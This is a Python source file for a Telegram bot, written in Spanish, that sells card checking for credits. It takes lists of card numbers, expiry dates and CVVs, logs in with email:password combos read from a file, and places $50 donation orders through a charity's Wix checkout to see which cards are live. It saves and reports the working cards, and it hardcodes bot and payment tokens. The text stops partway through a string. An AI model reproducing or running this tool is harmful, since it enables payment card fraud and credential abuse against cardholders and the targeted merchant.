#!/usr/bin/env python3
from datetime import datetime
import io
import json
import os
from pathlib import Path
import queue
import random
import re
import sys
import threading
import time
from typing import List
import requests
from telebot import apihelper, TeleBot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup

# Activar reintentos automáticos en fallas de red de Telegram
apihelper.RETRY_ON_ERROR = True

# Detectar ruta (Railway o Local)
if getattr(sys, "frozen", False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(__file__)

# =========================================================
# CONFIGURACIÓN DESDE VARIABLES DE ENTORNO (RAILWAY)
# =========================================================
TOKEN = os.getenv("TOKEN", "8531578967:AAEZykF8G26VsWB2C27h-ign6P3X7-Xrx0s")
PROPIETARIO_ID_ENV = os.getenv("PROPIETARIO_ID", "5504611412")
try:
    PROPIETARIO_ID = int(PROPIETARIO_ID_ENV)
except ValueError:
    PROPIETARIO_ID = 5504611412

bot = TeleBot(TOKEN)

# Estado global del bot
estado = {
    "en_progreso": False,
    "detener": False,
    "total": 0,
    "procesados": 0,
    "exitosos": 0,
    "fallidos": 0,
    "lista_exitos": [],
    "lista_fallos": [],
    "usuario_actual": "Anónimo",
    "chat_id_actual": None,
    "user_id_actual": None
}
estado_lock = threading.Lock()
cola_tareas = queue.Queue()
usuarios_espera_alerta = set()
espera_lock = threading.Lock()

# Contadores globales
contador_fail = 0
contador_success = 0
contador_expiradas = 0

# =========================================================
# RUTAS PERSISTENTES (VOLUMEN DE RAILWAY)
# =========================================================
DATA_DIR = os.path.join(BASE_DIR, "data") if os.path.exists(os.path.join(BASE_DIR, "data")) else BASE_DIR
os.makedirs(DATA_DIR, exist_ok=True)

ARCHIVO_CLIENTES = os.path.join(DATA_DIR, "clientes.txt")
LIVES_FILE = os.path.join(DATA_DIR, "lives.txt")
FAIL_FILE = os.path.join(DATA_DIR, "fail.txt")

creditos_lock = threading.Lock()

COSTO_SUCCESS = 4
COSTO_FAIL = 0
CREDITOS_INICIALES = 40  # 🎁 Créditos gratis para nuevos usuarios


def notificar_propietario(mensaje):
    """Envía un mensaje de log/reporte al propietario."""
    try:
        bot.send_message(PROPIETARIO_ID, mensaje, parse_mode="HTML")
    except Exception as e:
        print(f"Error al notificar al propietario: {e}")


def cargar_clientes():
    clientes = {}
    if not os.path.exists(ARCHIVO_CLIENTES):
        return clientes
    with open(ARCHIVO_CLIENTES, "r", encoding="utf-8") as f:
        for linea in f:
            linea = linea.strip()
            if not linea or linea.startswith("#"):
                continue
            partes = [p.strip() for p in linea.split(",")]
            if len(partes) >= 3:
                uid, uname, creds = partes[:3]
                try:
                    clientes[uid] = {"username": uname, "creditos": int(creds)}
                except ValueError:
                    pass
    return clientes


def guardar_clientes(clientes):
    with open(ARCHIVO_CLIENTES, "w", encoding="utf-8") as f:
        for uid, data in clientes.items():
            f.write(f"{uid},{data['username']},{data['creditos']}\n")


def obtener_saldo(user_id):
    with creditos_lock:
        clientes = cargar_clientes()
        user_str = str(user_id)
        if user_str in clientes:
            return clientes[user_str]["creditos"]
        return None


def registrar_usuario(user_id, username):
    """Registra al usuario y le otorga 40 créditos gratis si es su primera vez."""
    with creditos_lock:
        clientes = cargar_clientes()
        user_str = str(user_id)
        clean_uname = (username or "anonimo").lstrip("@")
        
        if user_str in clientes:
            if clientes[user_str]["username"] != clean_uname:
                clientes[user_str]["username"] = clean_uname
                guardar_clientes(clientes)
            return False, clientes[user_str]["creditos"]
        
        clientes[user_str] = {"username": clean_uname, "creditos": CREDITOS_INICIALES}
        guardar_clientes(clientes)

        notificar_propietario(
            f"👤 <b>NUEVO REGISTRO EN EL BOT (+40 CRÉDITOS)</b>\n"
            f"• <b>Usuario:</b> @{clean_uname}\n"
            f"• <b>ID:</b> <code>{user_id}</code>\n"
            f"• <b>Bono otorgado:</b> 40 créditos gratis"
        )
        return True, CREDITOS_INICIALES


def modificar_creditos_por_identificador(identificador, cantidad):
    """Permite sumar o restar créditos buscando por ID o Username."""
    with creditos_lock:
        clientes = cargar_clientes()
        id_buscado = str(identificador).strip().lstrip("@")
        
        user_key = None
        if id_buscado in clientes:
            user_key = id_buscado
        else:
            for uid, data in clientes.items():
                if data["username"].lower() == id_buscado.lower():
                    user_key = uid
                    break
        
        if not user_key:
            return False, "Usuario no encontrado en la base de datos."
        
        clientes[user_key]["creditos"] += cantidad
        if clientes[user_key]["creditos"] < 0:
            clientes[user_key]["creditos"] = 0
            
        nuevo_saldo = clientes[user_key]["creditos"]
        guardar_clientes(clientes)
        return True, (user_key, clientes[user_key]["username"], nuevo_saldo)


def cobrar_creditos_por_resultado(user_id, es_exito):
    costo = COSTO_SUCCESS if es_exito else COSTO_FAIL
    if costo == 0:
        return obtener_saldo(user_id) or 0, 0

    with creditos_lock:
        clientes = cargar_clientes()
        user_str = str(user_id)
        if user_str in clientes:
            clientes[user_str]["creditos"] = max(
                0, clientes[user_str]["creditos"] - costo
            )
            nuevo_saldo = clientes[user_str]["creditos"]
            guardar_clientes(clientes)
            return nuevo_saldo, costo
        return 0, costo


def validar_tarjeta(cc, mes, anio, cvv):
    if not (cc.isdigit() and len(cc) in [15, 16]):
        return False, "FORMATO_INVALIDO_CC"
    if not (mes.isdigit() and 1 <= int(mes) <= 12):
        return False, "FORMATO_INVALIDO_MES"
    if len(anio) == 2:
        anio_4 = f"20{anio}"
    elif len(anio) == 4:
        anio_4 = anio
    else:
        return False, "FORMATO_INVALIDO_ANIO"
    if not (cvv.isdigit() and len(cvv) in [3, 4]):
        return False, "FORMATO_INVALIDO_CVV"

    ahora = datetime.now()
    anio_int = int(anio_4)
    mes_int = int(mes)

    if anio_int < ahora.year or (anio_int == ahora.year and mes_int < ahora.month):
        return False, "EXPIRADA"

    return True, anio_4


def notificar_usuarios_en_espera():
    with espera_lock:
        if not usuarios_espera_alerta:
            return
        for u_id in list(usuarios_espera_alerta):
            try:
                bot.send_message(
                    u_id, 
                    "🔔 <b>¡El sistema ya está libre!</b> Ya puedes enviar tu nuevo lote de tarjetas.", 
                    parse_mode="HTML"
                )
            except Exception:
                pass
        usuarios_espera_alerta.clear()


def obtener_menu_principal():
    markup = InlineKeyboardMarkup()
    btn_check = InlineKeyboardButton("⚡ CHECK_CCS (STRIPE WIX $50)", callback_data="btn_check_ccs")
    btn_saldo = InlineKeyboardButton("💰 Mis Créditos", callback_data="btn_saldo")
    btn_instrucciones = InlineKeyboardButton("📖 Instrucciones", callback_data="btn_instrucciones")
    btn_formato = InlineKeyboardButton("📌 Formato Correcto", url="https://t.me/filtro_carbon_bot")
    btn_comprar = InlineKeyboardButton("🛒 Comprar", url="https://t.me/Juanper33z")
    btn_grupo = InlineKeyboardButton("📢 Mi Grupo", url="https://t.me/+kIN_CgyaWP5lZDUx")

    markup.row(btn_check, btn_saldo)
    markup.row(btn_instrucciones, btn_formato)
    markup.row(btn_comprar, btn_grupo)
    return markup


def generar_resumen_proceso(user_id=None):
    saldo_actual = obtener_saldo(user_id) if user_id else "N/A"
    resumen = (
        "📊 <b>RESUMEN DEL PROCESO</b>\n"
        "─────────────────────────\n"
        f"<b>Total procesadas:</b> {estado['procesados']}/{estado['total']}\n"
        f"✅ <b>SUCCESS:</b> {estado['exitosos']}\n"
        f"❌ <b>FAIL:</b> {estado['fallidos']}\n"
        f"⏳ <b>EXPIRADAS:</b> {contador_expiradas}\n"
        "─────────────────────────\n"
        f"💰 <b>Saldo actual:</b> {saldo_actual} créditos\n"
    )
    return resumen


def generar_informe_propietario():
    saldo_usuario = obtener_saldo(estado["user_id_actual"]) if estado["user_id_actual"] else "N/A"
    
    informe = f"🏁 <b>REPORTES Y RESULTADOS DE LOTE</b>\n"
    informe += f"👤 <b>Usuario:</b> @{estado['usuario_actual']} (<code>{estado['user_id_actual']}</code>)\n"
    informe += f"💰 <b>Saldo restante:</b> {saldo_usuario} cr.\n"
    informe += f"📊 <b>Totales:</b> {estado['procesados']}/{estado['total']} (✅ {estado['exitosos']} | ❌ {estado['fallidos']})\n\n"

    informe += "🟢 <b>ÉXITOS (LIVES):</b>\n"
    if estado["lista_exitos"]:
        for item in estado["lista_exitos"]:
            informe += f"• <code>{item['cc']}</code> | {item['msg']}\n"
    else:
        informe += "<i>Ninguna tarjeta aprobada.</i>\n"

    informe += "\n🔴 <b>FALLOS (FAILS):</b>\n"
    if estado["lista_fallos"]:
        for item in estado["lista_fallos"][:25]:
            informe += f"• <code>{item['cc']}</code> | {item['msg']}\n"
        if len(estado["lista_fallos"]) > 25:
            informe += f"<i>...y {len(estado['lista_fallos']) - 25} fallos más.</i>\n"
    else:
        informe += "<i>Sin fallos registrados.</i>\n"

    return informe


def solicitar_datos_ccs(chat_id, user_id):
    saldo = obtener_saldo(user_id)
    if saldo is None:
        bot.send_message(chat_id, "❌ No estás registrado. Escribe /start primero.")
        return

    if saldo < COSTO_SUCCESS:
        bot.send_message(
            chat_id,
            f"⛔ <b>Saldo insuficiente para iniciar:</b> Tienes <b>{saldo} créditos</b> y necesitas al menos <b>{COSTO_SUCCESS} créditos</b> para procesar.",
            parse_mode="HTML",
        )
        return

    with estado_lock:
        if estado["en_progreso"]:
            markup_aviso = InlineKeyboardMarkup()
            markup_aviso.add(InlineKeyboardButton("🔔 Avisarme cuando esté libre", callback_data="btn_avisar"))
            bot.send_message(
                chat_id,
                "⚠️ Ya hay un proceso de verificación en ejecución. ¿Deseas que te avise en cuanto quede desocupado?",
                reply_markup=markup_aviso,
            )
            return

    msg = bot.send_message(
        chat_id,
        f"📋 <b>Gate Stripe Wix Charger ($50) Active</b>\n"
        f"💳 <b>Saldo disponible: {saldo} créditos</b>\n"
        f"<i>(Costo: {COSTO_SUCCESS} créditos por SUCCESS | Fails totalmente GRATIS)</i>\n\n"
        "Envía tus tarjetas en formato <code>CC|MM|AAAA|CVV</code> o sube un archivo <code>.txt</code>:\n"
        "<i>(Si tu lista está desordenada, puedes formatearla con @filtro_carbon_bot)</i>",
        parse_mode="HTML",
    )
    bot.register_next_step_handler(msg, recibir_datos_lote)


def procesar_tarjeta_api(correo, password, linea_cc):
    try:
        cc_partes = linea_cc.split("|")
        cc = cc_partes[0]
        mm = cc_partes[1]
        yyyy = cc_partes[2]
        cvv = cc_partes[3]
    except IndexError:
        return False, "Formato incorrecto en la línea de tarjeta"

    session = requests.Session()

    try:
        # 1. GENERAR TOKEN CC EN WIX PCI
        url_token = "https://cashier-pci.wixapps.net/_api/payment-gateway-web/tokenize/v2/tokens"
        headers_token = {
            "Accept": "*/*",
            "Content-Type": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "User-Agent": "TAF/437 CFNetwork/3826.500.111.2.2 Darwin/24.4.0",
            "Connection": "keep-alive",
            "w-key": "NVpFU3p0TVFyV2t5NjhXMjJINGFLamJwelQyNVh6a3Q3VWVmQUNodFBtTm5qTjVFbjdScDI=",
            "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
            "w-app-metrics": 'ewogICJjbGllbnQiIDogewogICAgImlkIiA6ICIiLAogICAgImRldmljZSIgOiB7CiAgICAgICJhcHBWZXJzaW9uIiA6ICIyLjEuNDYiLAogICAgICAiZGV2aWNlSWQiIDogIjUwRjQ3RjE0LUEzMDctNENCOC04MjY2LUIwN0M0NTMzRkQ1NCIsCiAgICAgICJvcyIgOiAiaW9zIiwKICAgICAib3NWZXJzaW9uIiA6ICIxOC40IgogICAgfSwKICAgICJpbmZvIiA6IHsKICAgICAgInVzZXJfYWdlbnQiIDogImlPUyIsCiAgICAgICJ2dGV4X2F1dGhjb29kaWUiIDogIiIKICAgIH},KICAgICJlbWFpbCIgOiAiIgogIH0K}',
            "app-version": "437"
        }
        payload_token = {
            "client_id": "onepagecheckout",
            "client_secret": "onepageclient",
            "grant_type": "password",
            "email": correo,
            "password": password,
            "CSRFToken": ""
        }

        resp = session.post(url_token, json=payload_token, timeout=15)
        if "Ups! Credenciales incorrectas." in resp.text or resp.status_code in [400, 401]:
            return False, "Credenciales incorrectas (Combo inválido)"
        
        try:
            res_json = resp.json()
            if not res_json.get("token", {}).get("token"):
                # Intentar parseo alternativo segun estructura de respuesta
                pass
        except Exception:
            pass

        # Buscar token en texto plano o json
        match_token = re.search(r'\{"token":\{"token":"([^"]+)"', resp.text)
        if not match_token:
            return False, "No se pudo obtener el token de pago inicial"
        token_cc = match_token.group(1)

        # 2. OBTENER VISITOR ID
        idd2 = f"{random.randint(10000000, 99999999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(100000000000,999999999999)}"
        url_visitor = f"https://www.ecopil.org/_api/v1/access-tokens?cacheBust={idd2}"
        resp_visitor = session.get(url_visitor, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=10)
        visitor_id = resp_visitor.json().get("visitorId", "b4adb5adddaf4012663d4eb24d1b48b0")

        # 3. OBTENER NOMBRE RANDOM
        resp_name = session.get("https://randomuser.me/api/?nat=es", timeout=10).json()
        first = resp_name["results"][0]["name"]["first"]
        last = resp_name["results"][0]["name"]["last"]

        # 4. TOKEN V2 (PAYMENT DETAILS)
        url_details = "https://www.ecopil.org/_api/payment-services-web/payments/v2/payment-details"
        headers_common = {
            "Host": "www.ecopil.org",
            "X-Wix-Brand": "wix",
            "Authorization": "svLpBEAJ2N9PI4t5gHMLikIQwrQPKPDgUp6op-vMksg.eyJpbnN0YW5jZUlkIjoiMmY2MTlhNTItNjM4Ni00ZTkwLWFlM2MtZGJlNDFhOGUwMGE0IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA0VDIzOjA5OjA4LjUyOFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJvcmlnaW5JbnN0YW5jZUlkIjoiOWMxMmE4ZWEtMzBmYy00M2ZlLTljYjMtYjE0MTkxZjhjZTA0Iiwic2lkIjoiZjE4NWJmOGQtZmYzNC00ZjFiLWIwZWYtNWUwMzUxODBlNTVmIiwiYmlUb2tlbiI6IjE2NmUzMGJjLWI5N2ItMDY3Yi0wYTgwLWUzNWVmNDdlNWUxNCIsInNpdGVPd25lcklkIjoiMGEwNDRiMTYtZTA4Ny00MjYxLWE1ZDMtNDYwYTYxNjgwNzY5IiwiYnMiOiJzYWhpTi1xWmFNc29qY3diWlZJek9TSDRFRDZSU3hsX2R2OVR4QUtDRkVJIiwic2NkIjoiMjAyMC0wMi0yNVQwMToxMDoyOS45NTJaIn0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "Origin": "https://www.ecopil.org"
        }
        payload_details = {
            "details": {
                "paymentMethod": "creditCard",
                "billingAddress": {},
                "redirectTarget": "EMBEDDED",
                "installments": 1,
                "card": {
                    "numberToken": token_cc,
                    "securityCodeToken": token_cc,
                    "holderName": f"{first} {last}",
                    "expiryMonth": int(mm),
                    "expiryYear": int(yyyy)
                },
                "buyerInfo": {
                    "buyerId": visitor_id,
                    "buyerLanguage": "es"
                },
                "clientInfo": {
                    "deviceFingerprint": "b4adb5adddaf4012663d4eb24d1b48b0"
                }
            }
        }
        resp_details = session.post(url_details, headers=headers_common, json=payload_details, timeout=15)
        details_id = resp_details.json().get("detailsId")
        if not details_id:
            return False, "Error al generar detailsId de pago"

        # 5. CREAR CARRITO ($50 Donación / Item)
        url_cart = "https://www.ecopil.org/_api/cart-v2/v2/carts"
        payload_cart = {
            "cart": {
                "settings": {"lockGiftCard": True, "lockCouponCode": True},
                "source": {"channelType": "OTHER_PLATFORM"}
            },
            "catalogItems": [{
                "catalogReference": {
                    "appId": "333b456e-dd48-4d6b-b32b-9fd48d74e163",
                    "catalogItemId": "2c882aa1-c6c2-4e62-b524-c300209c357f",
                    "options": {"amount": 50, "frequency": "ONE_TIME"}
                },
                "quantity": 1
            }]
        }
        resp_cart = session.post(url_cart, headers=headers_common, json=payload_cart, timeout=15)
        cart_id = resp_cart.json().get("id")
        if not cart_id:
            return False, "Error al crear carrito de compra"

        # 6. PLACE ORDER (TESTEAR CC)
        url_place = f"https://www.ecopil.org/_api/cart-v2/v2/carts/{cart_id}/place-order"
        # Payload completo con token de verificación JWS fijo para el monto de $50
        payload_place = {
            "cartId": cart_id,
            "priceVerificationToken": "JWS.eyJraWQiOiJyVmxqX19LcSIsImFsZyI6IkhTMjU2In0.eyJkYXRhIjoie1wic3VidG90YWxcIjp7XCJhbW91bnRcIjpcIjUwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjUwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcImRpc2NvdW50XCI6e1wiYW1vdW50XCI6XCIwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjBcIixcInVua25vd25GaWVsZHNcIjp7XCJmaWVsZHNcIjp7fX19LFwiZGVsaXZlcnlcIjp7XCJhbW91bnRcIjpcIjBcIixcImNvbnZlcnRlZEFtb3VudFwiOlwiMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJhZGRpdGlvbmFsRmVlc1wiOntcImFtb3VudFwiOlwiMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCIwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInRheFwiOntcImFtb3VudFwiOlwiMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCIwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInRvdGFsXCI6e1wiYW1vdW50XCI6XCI1MC4wMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCI1MC4wMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJ0b3RhbEFmdGVyR2lmdENhcmRzXCI6e1wiYW1vdW50XCI6XCI1MC4wMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCI1MC4wMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJwYXlOb3dcIjp7XCJhbW91bnRcIjpcIjUwLjAwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjUwLjAwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInBheUxhdGVyXCI6e1wiYW1vdW50XCI6XCIwLjAwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjAuMDBcIixcInVua25vd25GaWVsZHNcIjp7XCJmaWVsZHNcIjp7fX19fSIsImlhdCI6MTc5MzgzMzc2OX0.VreyBM6e_HcIXyHfRa8Fu5xfQWoUzWSvFyAsHssObrs",
            "paymentToken": details_id,
            "redirectUrls": {
                "errorUrl": f"https://www.ecopil.org/checkout?checkoutId={cart_id}",
                "cancelUrl": f"https://www.ecopil.org/checkout?checkoutId={cart_id}",
                "successUrl": "https://www.ecopil.org/donation-thank-you-page/",
                "pendingUrl": "https://www.ecopil.org/donation-thank-you-page/"
            },
            "savePaymentMethod": False,
            "delayCapture": False
        }

        resp_place = session.post(url_place, headers=headers_common, json=payload_place, timeout=20)
        source_text = resp_place.text

        # Parseo de respuestas y KeyCheck
        if "description\":\"Invalid payment status: DECLINED\"" in source_text or "DECLINED" in source_text:
            msg_fail = "Declined"
            try:
                msg_fail = resp_place.json().get("description", "Declined")
            except Exception:
                pass
            with open(FAIL_FILE, "a", encoding="utf-8") as f:
                f.write(f"{linea_cc} | {msg_fail}\n")
            return False, msg_fail

        if "\"completed\":true" in source_text or "paymentResponseToken" in source_text or resp_place.status_code == 200:
            msg_success = "Approved ($50 Charged/Success)"
            with open(LIVES_FILE, "a", encoding="utf-8") as f:
                f.write(f"{linea_cc} | {msg_success}\n")
            return True, msg_success
        else:
            with open(FAIL_FILE, "a", encoding="utf-8") as f:
                f.write(f"{linea_cc} | {source_text[:100]}\n")
            return False, source_text[:100]

    except Exception as e:
        err_msg = f"Excepción en Gateway: {e}"
        with open(FAIL_FILE, "a", encoding="utf-8") as f:
            f.write(f"{linea_cc} | {err_msg}\n")
        return False, err_msg


def worker_principal():
    while True:
        if estado["detener"]:
            time.sleep(0.5)
            continue

        if cola_tareas.empty():
            time.sleep(1)
            continue

        tarea = cola_tareas.get()
        try:
            chat_id = tarea.get("chat_id")
            user_id = tarea.get("user_id")
            linea_cc = tarea.get("linea_cc")
            correo = tarea.get("correo")
            password = tarea.get("password")

            if user_id:
                saldo_actual = obtener_saldo(user_id)
                if saldo_actual is None or saldo_actual < COSTO_SUCCESS:
                    with estado_lock:
                        estado["en_progreso"] = False
                    bot.send_message(
                        chat_id, 
                        f"⛔ <b>Proceso detenido:</b> Tu saldo actual es de <b>{saldo_actual} créditos</b> y necesitas al menos <b>{COSTO_SUCCESS} créditos</b> para continuar procesando.", 
                        parse_mode="HTML"
                    )
                    break

            exito, mensaje_resultado = procesar_tarjeta_api(correo, password, linea_cc)

            if user_id:
                cobrar_creditos_por_resultado(user_id, exito)

            with estado_lock:
                estado["procesados"] += 1
                if exito:
                    estado["exitosos"] += 1
                    estado["lista_exitos"].append({"cc": linea_cc, "msg": mensaje_resultado})
                else:
                    estado["fallidos"] += 1
                    estado["lista_fallos"].append({"cc": linea_cc, "msg": mensaje_resultado})

            notificar_resultado_telegram(chat_id, exito, linea_cc, mensaje_resultado)

            with estado_lock:
                if estado["procesados"] >= estado["total"] or estado["detener"]:
                    estado["en_progreso"] = False
                    if estado["procesados"] >= estado["total"]:
                        resumen_final = generar_resumen_proceso(user_id)
                        bot.send_message(
                            chat_id, 
                            "🏁 <b>¡Proceso completado con éxito!</b>\n\n" + resumen_final, 
                            parse_mode="HTML"
                        )
                        notificar_propietario(generar_informe_propietario())
                        notificar_usuarios_en_espera()

        except Exception as e:
            print(f"Error en worker HTTP: {e}")
        finally:
            cola_tareas.task_done()
        
        time.sleep(1)


def notificar_resultado_telegram(chat_id, exito, linea_cc, mensaje_detectado):
    if not chat_id:
        return
    status_texto = "SUCCESS✅" if exito else "FAIL❌"
    mensaje = f"STATUS: {status_texto}\n💳 <code>{linea_cc}</code>\n💬 <b>Mensaje:</b> <i>{mensaje_detectado[:100]}</i>"
    try:
        bot.send_message(chat_id, mensaje, parse_mode="HTML")
    except Exception:
        pass


def recibir_datos_lote(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username or "Anonimo"
    texto_entrada = ""

    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            texto_entrada = downloaded_file.decode("utf-8", errors="ignore")
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error al leer el archivo: {e}")
            return
    elif message.text:
        texto_entrada = message.text

    if not texto_entrada.strip():
        bot.send_message(chat_id, "⚠️ No se recibió texto válido.")
        return

    patron = re.compile(r'(\d{15,16})[|/]?\s*(\d{2})[|/]\s*(\d{2,4})[|/]\s*(\d{3,4})')

    tarjetas_validas = []
    tarjetas_rechazadas = []

    for linea in texto_entrada.splitlines():
        linea = linea.strip()
        if not linea:
            continue
        coincidencia = patron.search(linea)
        if not coincidencia:
            tarjetas_rechazadas.append((linea, "FORMATO_MAL"))
            continue

        cc, mes, anio, cvv = coincidencia.groups()
        es_valida, resultado = validar_tarjeta(cc, mes, anio, cvv)

        if es_valida:
            linea_limpia = f"{cc}|{mes}|{resultado}|{cvv}"
            tarjetas_validas.append(linea_limpia)
        else:
            tarjetas_rechazadas.append((linea, resultado))

    if tarjetas_rechazadas:
        reporte_descartes = "⚠️ <b>Tarjetas omitidas (Sin cobro de créditos):</b>\n\n"
        for item, motivo in tarjetas_rechazadas[:20]:
            reporte_descartes += f"❌ <code>{item}</code> ➔ <b>{motivo}</b>\n"
        bot.send_message(chat_id, reporte_descartes, parse_mode="HTML")

    if not tarjetas_validas:
        bot.send_message(
            chat_id, 
            "⛔ Ninguna tarjeta válida para procesar.\n\n"
            "💡 Si tienes un texto sin formato, usa @filtro_carbon_bot para ordenarlos.",
            parse_mode="HTML"
        )
        return

    combos_path = os.path.join(BASE_DIR, "COMBO.txt")
    if not os.path.exists(combos_path):
        bot.send_message(chat_id, "❌ No se encontró el archivo `combo.txt` en el servidor.")
        return
    
    with open(combos_path, "r", encoding="utf-8") as f:
        combos = [l.strip() for l in f if ":" in l and l.strip()]

    if not combos:
        bot.send_message(chat_id, "❌ El archivo `combo.txt` está vacío.")
        return

    while not cola_tareas.empty():
        try:
            cola_tareas.get_nowait()
            cola_tareas.task_done()
        except queue.Empty:
            break

    with estado_lock:
        estado["en_progreso"] = True
        estado["detener"] = False
        estado["total"] = len(tarjetas_validas)
        estado["procesados"] = 0
        estado["exitosos"] = 0
        estado["fallidos"] = 0
        estado["lista_exitos"] = []
        estado["lista_fallos"] = []
        estado["usuario_actual"] = username
        estado["chat_id_actual"] = chat_id
        estado["user_id_actual"] = user_id

    global contador_expiradas
    contador_expiradas += len([r for r in tarjetas_rechazadas if r[1] == "EXPIRADA"])

    for linea_cc in tarjetas_validas:
        linea_combo = random.choice(combos)
        try:
            correo, password = linea_combo.split(":", 1)
        except ValueError:
            continue

        cola_tareas.put({
            "linea_cc": linea_cc,
            "correo": correo.strip(),
            "password": password.strip(),
            "chat_id": chat_id,
            "user_id": user_id
        })

    bot.send_message(
        chat_id,
        f"🚀 <b>Lote aceptado:</b> {len(tarjetas_validas)} tarjetas en cola (Stripe Wix Charger $50).",
        parse_mode="HTML"
    )

    notificar_propietario(
        f"🚀 <b>NUEVO CHEQUEO INICIADO</b>\n"
        f"• <b>Usuario:</b> @{username} (<code>{user_id}</code>)\n"
        f"• <b>Total de CCs:</b> {len(tarjetas_validas)}"
    )


@bot.message_handler(commands=["start"])
def cmd_start(message):
    uid = message.from_user.id
    uname = message.from_user.username
    creado, saldo = registrar_usuario(uid, uname)

    msg = f"👋 ¡Hola {message.from_user.first_name}!\n\n"
    if creado:
        msg += f"🎉 <b>¡Bienvenido! Se te han otorgado {CREDITOS_INICIALES} créditos gratis</b> por registrarte.\n\n"
    msg += f"💰 *Tus créditos actuales:* {saldo}\n\nUsa el menú para navegar."
    bot.send_message(message.chat.id, msg, parse_mode="HTML", reply_markup=obtener_menu_principal())


@bot.message_handler(commands=["id", "me", "perfil"])
def cmd_mi_perfil(message):
    uid = message.from_user.id
    uname = message.from_user.username or "Sin usuario"
    registrar_usuario(uid, message.from_user.username)
    saldo = obtener_saldo(uid)

    texto = (
        "👤 <b>TUS DATOS DE PERFIL</b>\n"
        "─────────────────────────\n"
        f"• <b>Nombre:</b> {message.from_user.first_name}\n"
        f"• <b>Username:</b> @{uname}\n"
        f"• <b>ID de Telegram:</b> <code>{uid}</code>\n"
        f"• <b>Créditos disponibles:</b> <b>{saldo}</b> 💰"
    )
    bot.send_message(message.chat.id, texto, parse_mode="HTML")


@bot.message_handler(commands=["creditos", "credit"])
def cmd_gestion_creditos(message):
    if message.from_user.id != PROPIETARIO_ID:
        bot.send_message(message.chat.id, "⛔ Comando exclusivo del administrador.")
        return

    partes = message.text.split()
    if len(partes) < 3:
        bot.send_message(
            message.chat.id,
            "⚠️ <b>Uso incorrecto del comando.</b>\n\n"
            "Formatos válidos:\n"
            "• <code>/creditos ID_o_Username +20</code> (para sumar)\n"
            "• <code>/creditos ID_o_Username -10</code> (para restar)\n"
            "• <code>/creditos ID_o_Username 50</code> (establece/suma directa)",
            parse_mode="HTML"
        )
        return

    identificador = partes[1]
    param_cant = partes[2]

    try:
        if param_cant.startswith("+"):
            cantidad = int(param_cant[1:])
        elif param_cant.startswith("-"):
            cantidad = -int(param_cant[1:])
        else:
            cantidad = int(param_cant)
    except ValueError:
        bot.send_message(message.chat.id, "❌ Cantidad inválida.", parse_mode="HTML")
        return

    exito, resultado = modificar_creditos_por_identificador(identificador, cantidad)
    if not exito:
        bot.send_message(message.chat.id, f"❌ {resultado}", parse_mode="HTML")
        return

    uid_afectado, uname_afectado, nuevo_saldo = resultado
    signo_str = f"+{cantidad}" if cantidad >= 0 else str(cantidad)

    bot.send_message(
        message.chat.id,
        f"✅ <b>CRÉDITOS ACTUALIZADOS</b>\n• Usuario: @{uname_afectado}\n• Saldo nuevo: <b>{nuevo_saldo}</b>",
        parse_mode="HTML"
    )


@bot.message_handler(commands=['stop', 'detener', 'parar'])
def cmd_stop_proceso(message):
    chat_id = message.chat.id
    with estado_lock:
        if not estado["en_progreso"]:
            bot.send_message(chat_id, "⚠️ No hay ningún proceso en ejecución.")
            return
        estado["detener"] = True
        estado["en_progreso"] = False

    while not cola_tareas.empty():
        try:
            cola_tareas.get_nowait()
            cola_tareas.task_done()
        except queue.Empty:
            break

    bot.send_message(chat_id, "🛑 <b>El proceso ha sido detenido.</b>", parse_mode="HTML")
    resumen_texto = generar_resumen_proceso(message.from_user.id)
    bot.send_message(chat_id, resumen_texto, parse_mode="HTML")
    notificar_usuarios_en_espera()


@bot.callback_query_handler(func=lambda call: True)
def callback_listener(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id

    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass

    if call.data == "btn_check_ccs":
        solicitar_datos_ccs(chat_id, user_id)
    elif call.data == "btn_saldo":
        saldo = obtener_saldo(user_id)
        bot.send_message(chat_id, f"💰 Tienes <b>{saldo}</b> créditos disponibles.", parse_mode="HTML")
    elif call.data == "btn_instrucciones":
        inst = (
            "📖 <b>GUÍA DEL BOT</b>\n\n"
